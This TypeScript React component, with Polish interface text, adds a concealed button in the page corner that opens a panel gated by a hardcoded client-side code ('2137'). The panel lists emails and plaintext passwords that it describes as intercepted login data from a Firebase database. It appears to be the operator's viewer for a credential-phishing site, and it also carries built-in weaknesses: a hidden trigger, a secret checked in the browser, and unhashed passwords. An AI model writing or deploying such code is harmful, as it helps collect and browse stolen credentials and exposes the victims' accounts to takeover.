"use client"

import { useState } from "react"
import { ShieldCheck, Eye, EyeOff, X, KeyRound, Clock, Mail } from "lucide-react"
import { Button } from "@/components/ui/button"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog"
import { Input } from "@/components/ui/input"
import { getPasswords } from "@/app/actions"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Badge } from "@/components/ui/badge"

export function AdminPanel() {
  const [isOpen, setIsOpen] = useState(false)
  const [showPrompt, setShowPrompt] = useState(false)
  const [secretCode, setSecretCode] = useState("")
  const [passwords, setPasswords] = useState<any[]>([])
  const [loading, setLoading] = useState(false)
  const [showRawPasswords, setShowRawPasswords] = useState<Record<string, boolean>>({})

  const handleOpenPrompt = () => setShowPrompt(true)

  const handleVerifyCode = async (e: React.FormEvent) => {
    e.preventDefault()
    if (secretCode === "2137") {
      setLoading(true)
      const result = await getPasswords()
      if (result.success) {
        setPasswords(result.data)
        setIsOpen(true)
        setShowPrompt(false)
        setSecretCode("")
      }
      setLoading(false)
    } else {
      setSecretCode("")
    }
  }

  const togglePasswordVisibility = (id: string) => {
    setShowRawPasswords(prev => ({ ...prev, [id]: !prev[id] }))
  }

  return (
    <>
      {/* Hidden Trigger Area */}
      <button
        onClick={handleOpenPrompt}
        className="fixed bottom-0 right-0 w-8 h-8 bg-transparent hover:bg-black/5 rounded-tl-full transition-colors z-50 cursor-default"
        title="Admin"
      />

      {/* Secret Code Dialog */}
      <Dialog open={showPrompt} onOpenChange={setShowPrompt}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Autoryzacja systemu</DialogTitle>
            <DialogDescription>
              Wprowadź kod dostępu aby przejść do panelu administracyjnego.
            </DialogDescription>
          </DialogHeader>
          <form onSubmit={handleVerifyCode} className="space-y-4 pt-4">
            <Input
              type="password"
              placeholder="Kod dostępu"
              value={secretCode}
              onChange={(e) => setSecretCode(e.target.value)}
              className="text-center text-2xl tracking-widest font-bold"
              autoFocus
            />
            <Button type="submit" className="w-full bg-primary" disabled={loading}>
              {loading ? "Weryfikacja..." : "Potwierdź"}
            </Button>
          </form>
        </DialogContent>
      </Dialog>

      {/* Passwords Display Dialog */}
      <Dialog open={isOpen} onOpenChange={setIsOpen}>
        <DialogContent className="sm:max-w-2xl max-h-[80vh] flex flex-col">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <ShieldCheck className="text-primary w-6 h-6" />
              Zarejestrowane hasła
            </DialogTitle>
            <DialogDescription>
              Lista przechwyconych danych logowania z bazy Firebase.
            </DialogDescription>
          </DialogHeader>

          <ScrollArea className="flex-1 mt-4 rounded-md border p-4 bg-muted/30">
            {passwords.length === 0 ? (
              <div className="text-center py-12 text-muted-foreground">
                Brak zapisanych danych w bazie.
              </div>
            ) : (
              <div className="space-y-4">
                {passwords.map((item) => (
                  <div key={item.id} className="p-4 rounded-lg bg-card border shadow-sm space-y-3">
                    <div className="flex justify-between items-start">
                      <div className="flex items-center gap-2 font-medium">
                        <Mail className="w-4 h-4 text-primary" />
                        {item.email}
                      </div>
                      <Badge variant="outline" className="text-[10px]">
                        <Clock className="w-3 h-3 mr-1" />
                        {new Date(item.timestamp).toLocaleString('pl-PL')}
                      </Badge>
                    </div>
                    
                    <div className="flex items-center justify-between bg-muted/50 p-3 rounded-md border">
                      <div className="flex items-center gap-3">
                        <KeyRound className="w-4 h-4 text-muted-foreground" />
                        <span className="font-mono font-semibold">
                          {showRawPasswords[item.id] ? item.password : "••••••••••••"}
                        </span>
                      </div>
                      <Button
                        variant="ghost"
                        size="icon"
                        onClick={() => togglePasswordVisibility(item.id)}
                      >
                        {showRawPasswords[item.id] ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </ScrollArea>

          <div className="pt-4 flex justify-end">
            <Button variant="outline" onClick={() => setIsOpen(false)}>
              Zamknij panel
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </>
  )
}
